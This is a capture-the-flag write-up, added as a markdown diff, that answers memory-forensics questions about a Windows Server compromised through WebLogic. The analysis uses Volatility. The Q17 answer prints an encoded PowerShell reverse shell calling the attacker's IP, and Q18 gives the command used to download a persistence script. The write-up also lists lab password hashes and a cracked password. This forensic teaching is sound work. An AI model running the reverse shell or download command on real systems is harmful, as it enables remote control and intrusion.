@@ -1,0 +1,414 @@
+## Q#1 What is the SHA256 hash value of the RAM image?
+Weight: 50 - Solved: 0
+### A#1 
+Just generate the sha256 hash:
+```shell
+sha256sum memory.mem 	5b3b1e1c92ddb1c128eca0fa8c917c16c275ad4c95b19915a288a745f9960f39  memory.mem
+```
+The flag is: 
+> 5b3b1e1c92ddb1c128eca0fa8c917c16c275ad4c95b19915a288a745f9960f39
+
+
+## Q#2 What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)
+Weight: 50 - Solved: 0
+### A#2 
+We could use the info plugin for this as well:
+
+```shell
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.info  
+Volatility 3 Framework 2.0.0
+Progress:  100.00		PDB scanning finished                        
+Variable	Value
+
+Kernel Base	0xf8024b67a000
+DTB	0x1ab000
+Symbols	file:///home/ulli/Documents/Tools/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/3DFC5F7228304C26859E55E481700385-1.json.xz
+Is64Bit	True
+IsPAE	False
+layer_name	0 WindowsIntel32e
+memory_layer	1 FileLayer
+KdVersionBlock	0xf8024b96ccf8
+Major/Minor	15.14393
+MachineType	34404
+KeNumberProcessors	4
+SystemTime	2021-08-06 16:13:23
+NtSystemRoot	C:\Windows
+NtProductType	NtProductServer
+NtMajorVersion	10
+NtMinorVersion	0
+PE MajorOperatingSystemVersion	10
+PE MinorOperatingSystemVersion	0
+PE Machine	34404
+PE TimeDateStamp	Wed Dec 21 06:50:57 2016
+```
+The timestamp should be `SystemTime	2021-08-06 16:13:23`
+> 2021-08-06 16:13:23
+
+
+## Q#3 What volatility2 profile is the most appropriate for this machine. imageinfo will take a long try to figure another way to determine the profile? (ex: Win10x86_14393)
+Weight: 150- Solved: 0
+### A#3 
+Via the plugin imageinfo in volatility2 you can get this information, but as the question told us, it takes a long time. Because of that and because I'm using 
+volatility3 I scanned via plugin info and got `Major/Minor	15.14393` version. With this I looked at the help from volatility2 and found this:
+
+```shell
+Win10x86_14393        - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16)
+Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)
+```
+I think some of this to profiles should be the flag.
+
+But that is not the flag :-( so - in the meanwhile the imageinfo of volatility2 ended... 
+
+```shell
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+
+          Suggested Profile(s) : No suggestion (Instantiated with Win10x64_15063)
+                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/ulli/Documents/ctf/bsidesjeddah/memory.mem)
+                      PAE type : No PAE
+                           DTB : 0x1ab000L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2021-08-06 16:13:23 UTC+0000
+     Image local date and time : 2021-08-06 09:13:23 -0700
+```
+Did not help either... because volatility just guessed.
+
+Okay - because of the `MachineType	34404` we know its an `Amd64 	34404 	AMD64 (K8).` (According to [microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.portableexecutable.machine?view=net-5.0)).
+
+There are only this profiles for windows 10 and 64bit architecture
+```
+Win10x64              - A Profile for Windows 10 x64
+Win10x64_10240_17770  - A Profile for Windows 10 x64 (10.0.10240.17770 / 2018-02-10)
+Win10x64_10586        - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23)
+Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)
+Win10x64_15063        - A Profile for Windows 10 x64 (10.0.15063.0 / 2017-04-04)
+Win10x64_16299        - A Profile for Windows 10 x64 (10.0.16299.0 / 2017-09-22)
+Win10x64_17134        - A Profile for Windows 10 x64 (10.0.17134.1 / 2018-04-11)
+Win10x64_17763        - A Profile for Windows 10 x64 (10.0.17763.0 / 2018-10-12)
+Win10x64_18362        - A Profile for Windows 10 x64 (10.0.18362.0 / 2019-04-23)
+Win10x64_19041        - A Profile for Windows 10 x64 (10.0.19041.0 / 2020-04-17)
+```
+None of them are working... hmm. After a while of struggling and not having fun with this task and working on other tasks, I finally found something.
+I looked at the registry by using `windows.registry.printkey` for some infos about the open programs and there content.
+While using this command
+```shell
+python3 vol.py -f ~/Documents/ctf/bsidesjeddah/memory.mem windows.registry.printkey --offset 0x808fe858e000 --key 'Microsoft\Windows NT\CurrentVersion'
+```
+I found out, that we are using Win2016 Server
+```shell
+2021-08-06 15:26:18.000000    0x808fe858e000 REG_SZ    \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion   ProductName    "Windows Server 2016 Standard Evaluation"
+```
+I looked at volatility2 and the profiles and finally found the flag"
+> Win2016x64_14393
+
+
+## Q#4 What is the computer's name?
+Weight: 50- Solved: 0
+### A#4 
+To get the computername we can readout the envars from the dump:
+```shell
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem envars | grep -i COMPUTERNAME | head -n 5                                      ✔  9s  
+560gresswinlogon.exe	0x2bb9af213e0canCOMPUTERNAMEd   WIN-8QOTRH7EMHC      
+568	wininit.exe	0x1c700f413e0	COMPUTERNAME	WIN-8QOTRH7EMHC
+652	services.exe	0x25283c21730	COMPUTERNAME	WIN-8QOTRH7EMHC
+664	lsass.exe	0x2536c841730	COMPUTERNAME	WIN-8QOTRH7EMHC
+764	svchost.exe	0x1e752421910	COMPUTERNAME	WIN-8QOTRH7EMHC
+```
+So the computername should be `WIN-8QOTRH7EMHC`
+
+Flag is:
+> WIN-8QOTRH7EMHC
+
+
+## Q#5 What is the system IP address?
+Weight: 50- Solved: 0
+### A#5 
+We need to get use a plugin to get the network connections or something like that. I'll tried windows.netscan (volatility3).
+```
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.netscan | head -n 10                              
+Volatility 3 Framework 2.0.0	PDB scanning finished                        
+
+Offset	Proto	LocalAddr	LocalPort	ForeignAddr	ForeignPort	State	PID	Owner	Created
+
+0xb68cb05a9300	TCPv4	0.0.0.0	49668	0.0.0.0	0	LISTENING	1592	spoolsv.exe	2021-08-06 15:26:34.000000 
+0xb68cb05a9300	TCPv6	::	49668	::	0	LISTENING	1592	spoolsv.exe	2021-08-06 15:26:34.000000 
+0xb68cb0751010	TCPv4	192.168.144.131	80	0.0.0.0	0	LISTENING	508	svchost.exe	2021-08-06 15:26:45.000000 
+0xb68cb0766d40	UDPv6	::1	1900	*	0		3176	svchost.exe	2021-08-06 15:27:19.000000 
+```
+The localaddr should give us the IP-Address. Beside the results for "any" or "localhost" we see something "192.168.144.131".
+This should be the flag.
+
+> 192.168.144.131
+
+
+## Q#6 How many established network connections were at the time of acquisition?
+Weight: 50- Solved: 0
+### A#6
+We can use the same command to determine the amount of established connections, okay - just the first step. With this result we have to grep and count.
+
+`python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.netscan > netconnections.txt`
+
+```shell
+grep -i "established" ../../ctf/bsidesjeddah/netconnections.txt | wc -l   
+12
+```
+
+So there should be twelve established connections at the time of acquisition.
+> 12
+
+
+## Q#7 What is the PID of explorer.exe?
+Weight: 50- Solved: 0
+### A#7
+For this, there is the plugin windows.pslist. I'll directly grep for explorer.
+```
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.pslist | grep explorer
+2676ress114000.0explorer.exe	0xb68cb2d36800in50hed   -       1       False	2021-08-06 15:29:16.000000 	N/A	Disabled
+```
+
+There it is, the process id (PID) is 2676.
+> 2676
+
+## Q#8 What is the title of the webpage the admin visited using IE? Two words, one-space
+Weight: 50- Solved: 0
+For this task we should use volatility2, because there you can use iehistory direct.
+For this I'll need to ask my teammate :) (Shoutout to smilymarco)
+
+```powershell
+volatility_2.6_win64_standalone.exe -f ..\bsides\memory.mem --profile=Win2016x64_14393 iehistory
+Volatility Foundation Volatility Framework 2.6
+**
+Process: 2676 explorer.exe
+Cache type "DEST" at 0x629d939
+Last modified: 2021-08-06 08:39:52 UTC+0000
+Last accessed: 2021-08-06 15:39:52 UTC+0000
+URL: Administrator@https://news.google.com/topstories?hl=en-US&gl=US&ceid=US:en
+Title: Google News
+```
+And there the flag is:
+> Google News
+
+
+## Q#9 What company developed the program used for memory acquisition?
+Weight: 100- Solved: 0
+### A#9
+While reading the cmdline output from the memorydump (`windows.cmdline`), I saw an executable, that could be the program for memory acquisition.
+So I did a littlebit of research for the tool `RamCapturer\x64\RamCapture64.exe`. (Just googling)
+The second result was from Belkasoft (Belkasoft RAM Capturer - to be precise).
+So this should be the flag ;-)
+> Belkasoft
+
+
+## Q#10 What is the administrator user password?
+Weight: 100- Solved: 0
+### A#10
+To get the hashes we need to use the plugin windows.hashdump within volatility3.
+
+```shell
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.hashdump    
+Volatility 3 Framework 2.0.0
+Progress:  100.00		PDB scanning finished                        
+User	rid	lmhash	nthash
+
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	3aff70b832f6170bda6f7b641563f60b
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+```
+So there are the hashes, now we can use hashcat, john or some onlineservice as [https://crackstation.net/](https://crackstation.net/). I used crackstation and got my flag:
+
+> 52(dumbledore)oxim
+
+
+## Q#11 What is the version of the WebLogic server installed on the system?
+Weight: 150- Solved: 0
+### A#11
+In the cmdlist output I found the WebLogic Server directory - (wls1411). I start googleing around, where to find the version info.
+After I found a manual to wls version 14.1.1.0.0, I just enter that value. BOOM There was the flag:
+> 14.1.1.0.0
+
+
+## Q#12 The admin set a port forward rule to redirect the traffic from the public port to the WebLogic admin portal port. What is the public and WebLogic admin portal port number? Format PublicPort:WebLogicPort (22:1337)
+Weight: 200- Solved: 0
+### A#12
+For this task I looked at the registry, where the firewall-rules are stored. Therefore I use the plugin windows.printkey with the following offset and key values. 
+```shell
+python3 ../../Tools/volatility3/vol.py -f memory.mem windows.registry.printkey --offset 0x808fe7e41000 --key 'ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules' | grep WebLogic
+2021-08-06 11:05:38.000000    0x808fe7e41000inREG_SZ  \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules {ACAB0365-5BFD-47D3-97FE-C0158EE875AD}  "v2.26|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=80|Name=WebLogic Server|"    False
+2021-08-06 11:05:38.000000    0x808fe7e41000 REG_SZ    \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules     {43E66E03-F890-4525-9698-9A7D77E6B751}  "v2.26|Action=Allow|Active=TRUE|Dir=Out|Protocol=6|RPort=80|Name=WebLogic Server|"   False
+```
+As we can see, the Rule will accept traffic on port 80. I assume, this is the public port. Because I couldn't find the nat-rules, i decided to look at the netscan again.
+I focused on the JAVA processes, paying special attention to the process with the number 4752, as this was used by the attacker as a gateway.
+```shell
+python3 vol.py -f ~/Documents/ctf/bsidesjeddah/memory.mem windows.netscan | grep java | grep 4752   
+0xb68cb1f6e740.0TCPv4    127.0.0.1DB scan49676fin127.0.0.1       49675   ESTABLISHED 4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb2a89010 TCPv4     127.0.0.1 49678     127.0.0.1 49677     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb2b50010 TCPv4     127.0.0.1 49675     127.0.0.1 49676     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb2c58a50 TCPv6     7f00:1::98b0:6cb1:8cb6:ffff   7001 ::   0    LISTENING 4752 java.exe  2021-08-06 15:31:00.000000 
+0xb68cb2cc8580 TCPv4     127.0.0.1 49680     127.0.0.1 49679     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb2ccc010 TCPv4     127.0.0.1 49679     127.0.0.1 49680     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb2e135c0 TCPv4     127.0.0.1 49686     127.0.0.1 49687     ESTABLISHED    4752 java.exe  2021-08-06 15:30:39.000000 
+0xb68cb2e57ec0 TCPv6     c0a8:9083::c8e0:70b2:8cb6:ffff     7001 ::   0    LISTENING 4752 java.exe  2021-08-06 15:31:00.000000 
+0xb68cb31c6380 TCPv4     127.0.0.1 49682     127.0.0.1 49681     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb31c7010 TCPv4     127.0.0.1 49681     127.0.0.1 49682     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb31e5010 TCPv4     127.0.0.1 49687     127.0.0.1 49686     ESTABLISHED    4752 java.exe  2021-08-06 15:30:39.000000 
+0xb68cb31f0d00 TCPv4     127.0.0.1 49677     127.0.0.1 49678     ESTABLISHED    4752 java.exe  2021-08-06 15:30:28.000000 
+0xb68cb3266780 TCPv6     2001:0:2851:782c:d2:133b:3f57:6f7c 7001 ::   0    LISTENING 4752 java.exe  2021-08-06 15:31:00.000000 
+0xb68cb32ba4f0 TCPv6     ::1  7001 ::   0    LISTENING 4752 java.exe  2021-08-06 15:31:01.000000 
+0xf8024bdf2ec0 TCPv6     c0a8:9083::c8e0:70b2:8cb6:ffff     7001 ::   0    LISTENING 4752 java.exe  2021-08-06 15:31:00.000000 
+0xf8024be475c0 TCPv4     127.0.0.1 49686     127.0.0.1 49687     ESTABLISHED    4752 java.exe  2021-08-06 15:30:39.000000 
+```
+According to the process the listening local port is 7001, so the flag should be 80:7001 - lets try that ... and?
+
+> 80:7001
+
+GREAT!
+
+
+## Q#13 The attacker gain access through WebLogic Server. What is the PID of the process responsible for the initial exploit?
+Weight: 150- Solved: 0
+### A#13
+Okay, it must be a java process.. but first, we need to get all processes in a tree form. Therefor we can use `windows.pstree`, so I fired it up:
+```shell
+python3 vol.py -f ../../ctf/bsidesjeddah/memory.mem windows.pstree  
+Volatility 3 Framework 2.0.0
+Progress:  100.00		PDB scanning finished                        
+PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime
+
+4	0	System	0xb68cb04ac040	113	-	N/A	False	2021-08-06 15:26:02.000000 	N/A
+* 292	4	smss.exe	0xb68cb168f800	2	-	N/A	False	2021-08-06 15:26:02.000000 	N/A
+** 504	292	smss.exe	0xb68cb1ccf080	0	-	1	False	2021-08-06 15:26:11.000000 	2021-08-06 15:26:11.000000 
+*** 512	504	csrss.exe	0xb68cb17d9540	12	-	1	False	2021-08-06 15:26:11.000000 	N/A
+*** 560	504	winlogon.exe	0xb68cb1ea5080	2	-	1	False	2021-08-06 15:26:11.000000 	N/A
+**** 912	560	dwm.exe	0xb68cb1ff5080	15	-	1	False	2021-08-06 15:26:18.000000 	N/A
+**** 2824	560	fontdrvhost.ex	0xb68cb1ff3080	5	-	1	False	2021-08-06 15:35:54.000000 	N/A
+**** 1140	560	userinit.exe	0xb68cb2b73280	0	-	1	False	2021-08-06 15:29:16.000000 	2021-08-06 15:29:40.000000 
+***** 2676	1140	explorer.exe	0xb68cb2d36800	50	-	1	False	2021-08-06 15:29:16.000000 	N/A
+****** 2688	2676	mmc.exe	0xb68cb382a5c0	14	-	1	False	2021-08-06 15:56:56.000000 	N/A
+****** 4356	2676	cmd.exe	0xb68cb317d340	1	-	1	False	2021-08-06 15:29:59.000000 	N/A
+******* 4456	4356	java.exe	0xb68cb2f21800	16	-	1	False	2021-08-06 15:30:00.000000 	N/A
+******* 4364	4356	conhost.exe	0xb68cb277f800	3	-	1	False	2021-08-06 15:29:59.000000 	N/A
+****** 2568	2676	RamCapture64.e	0xb68cb3256580	4	-	1	False	2021-08-06 16:13:20.000000 	N/A
+******* 3524	2568	conhost.exe	0xb68cb3871800	3	-	1	False	2021-08-06 16:13:20.000000 	N/A
+****** 4556	2676	cmd.exe	0xb68cb2cfb600	1	-	1	False	2021-08-06 15:30:04.000000 	N/A
+******* 4736	4556	cmd.exe	0xb68cb2333080	1	-	1	False	2021-08-06 15:30:05.000000 	N/A
+******** 4772	4736	java.exe	0xb68cb2344080	18	-	1	False	2021-08-06 15:30:05.000000 	N/A
+******* 4564	4556	conhost.exe	0xb68cb2a1f480	3	-	1	False	2021-08-06 15:30:04.000000 	N/A
+******* 4752	4556	java.exe	0xb68cb23e4080	44	-	1	False	2021-08-06 15:30:05.000000 	N/A
+******** 3520	4752	powershell.exe	0xb68cb3045080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 3684	4752	powershell.exe	0xb68cb2df3080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 4200	4752	powershell.exe	0xb68cb356f080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 4264	4752	powershell.exe	0xb68cb22fe080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 776	4752	powershell.exe	0xb68cb34c2800	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 2712	4752	powershell.exe	0xb68cb322f800	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:45.000000 
+******** 1616	4752	powershell.exe	0xb68cb34ca800	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 2132	4752	powershell.exe	0xb68cb33c9080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 1012	4752	powershell.exe	0xb68cb32fa800	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:44.000000 
+******** 4344	4752	powershell.exe	0xb68cb32c6800	15	-	1	False	2021-08-06 15:51:40.000000 	N/A
+********* 1488	4344	svchost.exe	0xb68cb24b5080	7	-	1	False	2021-08-06 16:06:50.000000 	N/A
+********* 4636	4344	conhost.exe	0xb68cb2444680	1	-	1	False	2021-08-06 15:51:40.000000 	N/A
+******** 3676	4752	powershell.exe	0xb68cb1f64080	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:45.000000 
+******** 2200	4752	powershell.exe	0xb68cb34b6800	0	-	1	False	2021-08-06 15:51:40.000000 	2021-08-06 15:51:45.000000 
+****** 3732	2676	vmtoolsd.exe	0xb68cb2b6d800	8	-	1	False	2021-08-06 15:29:32.000000 	N/A
+2552	3488	ServerManager.	0xb68cb2f17800	12	-	1	False	2021-08-06 15:29:22.000000 	N/A
+4172	4132	jusched.exe	0xb68cb3039800	1	-	1	True	2021-08-06 15:29:34.000000 	N/A
+* 1392	4172	jucheck.exe	0xb68cb3476080	4	-	1	True	2021-08-06 15:34:34.000000 	N/A
+4596	800	notepad.exe	0xb68cb3309080	3	-	1	False	2021-08-06 16:12:52.000000 	N/A
+```
+So our java process must be the 4752, because a bunch of powershell processes were load as child processes.
+So the flag is:
+> 4752
+
+
+## Q#14 what is the PID of the next entry to the previous process? (Hint: ActiveProcessLinks list)
+Weight: 200- Solved: 0
+### A#14
+We need to look at the proccesslist here, because the tree is mixed up. Therefor use `windows.pslist`.
+Then look at the proccess from the previous task `4752` and the next proccess in line is `4772`.
+There is your flag
+> 4772
+
+
+## Q#15 How many threads does the previous process have?
+Weight: 150- Solved: 0
+### A#15
+You can use output from the previous task, but you need to look at the previous proccess from `4772`. Look at the threads from `4752` to be precise.
+Then you have your flag:
+> 4
+4
+
+## Q#16 The attacker gain access to the system through the webserver. What is the CVE number of the vulnerability exploited?
+Weight: 200- Solved: 0
+### A#16
+Okay, we know the version and the application the attacker used. Lets have a look on [exploit-db.com](https://www.exploit-db.com) and search for WebLogic Server and 
+the version 14.1.1.0.0. I found a bunch of vulnerabilities but one was quite interesting. It allowed an `Unauthenticated RCE via GET request` - okay lets go for it.
+This vulnerability has the CVE-2020-14882 and this is the flag.
+> CVE-2020-14882
+
+
+## Q#17 The attacker used the vulnerability he found in the webserver to execute a reverse shell command to his server. Provide the IP and port of the attacker server? Format: IP:port
+Weight: 200- Solved: 0
+### A#17
+I used the plugin windows.cmdline and saw an cmd that was very sus:
+
+```shell
+[...]
+2824	fontdrvhost.ex	"fontdrvhost.exe"
+840	armsvc.exe	"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"
+4344	powershell.exe	powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+4636	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
+4200	powershell.exe	Required memory at 0x9888ee7020 is not valid (process exited?)
+[...]
+
+After decoding the base64 string with 
+
+```shell
+echo "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" | base64 -d
+```
+I got this powershell command:
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("192.168.144.129",1339);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+So the attacker sends back to the ip:port `192.168.144.129:1339` and so the flag is
+> 192.168.144.129:1339
+
+
+## Q#18 The attacker downloaded multiple files from the his own web server. Provide the Command used to download the PowerShell script used for persistence?
+Weight: 200- Solved: 0
+### A#18
+My teammate smilymarco has solved this one, by searching for an Invoke-WebRequest command  in the strings of the memorydump and found the flag.
+> invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile "./presist.ps1"
+
+## Q#19 What is the MITRE ID related to the persistence technique the attacker used?
+Weight: 200- Solved: 0
+### A#19
+We now know, that the attacker get access through the WebLogic Service on the host, then the attacker downloaded several files and executed them with powershell, and then? How did the attacker get the persistence? In the output from `windows.cmdline` I saw something odd, so lets take a look at the line I just mentioned.
+```shell
+1012 powershell.exe Required memory at 0x5afb111020 is not valid (process exited?)
+2200 powershell.exe Required memory at 0x91e1d32020 is not valid (process exited?)
+776  powershell.exe Required memory at 0xe57ea22020 is not valid (process exited?)
+1616 powershell.exe Required memory at 0x508be21020 is not valid (process exited?)
+2688 mmc.exe   "C:\Windows\system32\mmc.exe" "C:\Windows\system32\taskschd.msc" /s
+```
+because this commandline were quite close to the powershell commands, I can assume, he used the scheduled tasks to get persistence.
+Lets have a look at the MITRE catalogue.
+There we can find the following line in the "Tactics-Enterprise-Persistence" section:
+| ID | Name | Description |
+| ------- | ------- | ------- |
+| T1053 | Scheduled Task/Job | Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system. |
+| .005 | Scheduled Task | Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task. |
+
+So the MITRE ID should be T1053.005! BAM!
+> T1053.005
+
+
+## Q#20 After maintaining persistence, the attacker dropped a cobalt strike beacon. Try to analyze it and provide the Publickey_MD5.
+Weight: 200- Solved: 0
+
+
+
+## Q#21 What is the URL of the exfiltrated data?
+Weight: 150- Solved: 0
+### A#21
+While analyzing the data for Q18 we were running strings on the dump. There was a strange line "https://pastebin.com/A0Ljk8tu" so we tried that.
+It is the flag.
+> https://pastebin.com/A0Ljk8tu
